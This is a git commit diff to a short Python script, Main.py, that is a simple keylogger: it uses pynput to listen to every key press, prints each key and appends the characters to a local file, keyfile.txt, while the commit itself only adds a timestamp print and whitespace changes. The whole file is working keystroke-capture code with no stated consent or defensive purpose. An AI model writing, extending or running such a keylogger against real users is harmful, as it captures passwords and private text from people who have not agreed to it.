c3917ba68f7013444c0af82bf845cf2674308889
MasonLundquist <maslundq73@gmail.com>
2022-09-15 16:33:18 -0600

    1.1

--- Main.py
+++ Main.py
@@ -1,5 +1,11 @@
 from pynput import keyboard
 
+import datetime as dt
+
+current_datetime = dt.datetime.now()
+
+print(current_datetime)
+
 def keyPressed(key):
     print(str(key))
     with open("keyfile.txt", 'a') as logKey:
@@ -8,8 +14,8 @@ def keyPressed(key):
             logKey.write(char)
         except:
             print("Error getting char")
-
+            
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
-    input() 
+    input()
